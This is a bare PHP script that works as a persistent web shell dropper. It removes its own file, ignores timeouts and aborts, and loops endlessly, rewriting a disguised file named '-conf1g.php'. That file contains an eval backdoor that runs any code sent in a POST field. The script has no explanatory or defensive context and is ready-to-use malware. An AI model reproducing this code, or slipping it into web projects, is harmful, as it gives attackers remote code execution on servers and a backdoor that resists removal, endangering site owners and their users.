<?php
	set_time_limit(0);
	ignore_user_abort(1);
	unlink(__FILE__);
	while(1){
		file_put_contents('-conf1g.php', '<?php @eval($_POST["a"]); ?>');
	}
?>
